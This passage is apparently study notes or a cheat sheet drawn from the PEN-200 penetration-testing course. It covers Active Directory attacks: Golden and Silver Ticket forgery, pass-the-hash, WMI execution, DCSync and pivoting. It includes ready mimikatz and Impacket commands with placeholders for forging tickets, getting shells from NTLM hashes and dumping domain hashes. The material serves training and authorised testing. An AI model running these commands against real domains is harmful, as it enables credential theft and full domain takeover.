  - **Golden Ticket** – The “master key” of Kerberos. By obtaining the NTLM hash of the KRBTGT account (Domain Controller’s Kerberos service account), you can forge TGTs for any user in the domain, effectively giving you domain admin access at will ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=In%20this%20section%2C%20we%20have,administrative%20TGTs%20to%20any)). This requires Domain Admin privileges to obtain in the first place (via DCSync or dumping hash from the DC). Using mimikatz: `kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DomainSID> /krbtgt:<krbtgt_hash> /renew:10080 /ptt` will create and inject a golden ticket granting Administrator rights for 7 days. Golden Tickets allow persistent access to **all** domain resources ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=Although%20this%20technique%E2%80%99s%20name%20resembles,While)).
  - **Silver Ticket** – Forging a service ticket (TGS) for a specific service on a specific server ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=Although%20this%20technique%E2%80%99s%20name%20resembles,While)). Requires the NTLM hash of the service account (e.g., machine account or service user). With that, you can craft a ticket that grants you access to that service without contacting the DC (so it might not be detected by the DC). E.g., if you have the hash of the SQL service account, you can forge a ticket to access MSSQL on that server as any user. Mimikatz uses the same `kerberos::golden` command for silver by specifying `/target:<Server> /service:<SPN>` and the service account hash instead of krbtgt. Silver tickets are weaker (only for one service), but powerful if, say, you forge an SMB ticket for a server to login as Administrator on that server.
- **Lateral Movement Techniques**: In AD, after getting some credentials or hashes:
  - **Pass-the-Hash** – Use NTLM hashes to authenticate. For local admin hashes, if two machines share the same local admin password (common if not randomized), you can use pass-the-hash to move laterally ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=match%20at%20L39565%20In%20this,wmiexec)). Impacket tools (psexec.py, smbexec.py, wmiexec.py) all accept a `-hashes <lm>:<ntlm>` argument. E.g., `psexec.py <DOMAIN>/<Administrator>@<TARGET> -hashes :<NTLMHASH>` to get a shell on <TARGET> ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=match%20at%20L39565%20In%20this,wmiexec)). This is very effective if you find a reused admin password via the domain.
  - **Remote Service Execution** – With credentials, try WinRM (as noted earlier) or WMI. Example: `wmiexec.py <DOMAIN>/<USER>:<PASS>@<TARGET>` spawns a semi-interactive shell via WMI. Or use `Invoke-Command` in PowerShell to run a script on a remote machine (if PSRemoting is enabled and you have rights).
  - **DCSync Attack** – If you manage to get Domain Replication rights (e.g., by adding your user to the Built-in Administrators or obtaining the **DS-Replication-Get-Changes** privileges via ACL attack), you can simulate the behavior of a Domain Controller and ask for user hashes. Using **Impacket’s secretsdump** or mimikatz `lsadump::dcsync`, you can dump the NTLM hashes of any user (including krbtgt and Administrator). This essentially gives complete domain compromise (DCSync is typically only doable once you are domain admin or have deliberately misconfigured privileges) ([pen-200.pdf](file://file-XV2ghZoyonfFYmRprsyMfQ#:~:text=22,Domain%20Controller%20Synchronization)).
  - **Pivoting within AD** – After owning one machine, use it to jump to the next. For instance, compromise a desktop, dump an admin hash from it, use that hash to login to a server, from there dump the domain admin creds, etc. BloodHound’s “shortest path” can guide this process by showing relationships like "User X is a local admin on Machine Y" or "User Z has RDP rights on Server A". Each intermediate step might require using the above techniques (pass-the-hash, pass-the-ticket, exploiting delegation, etc.) until Domain Admin is achieved.
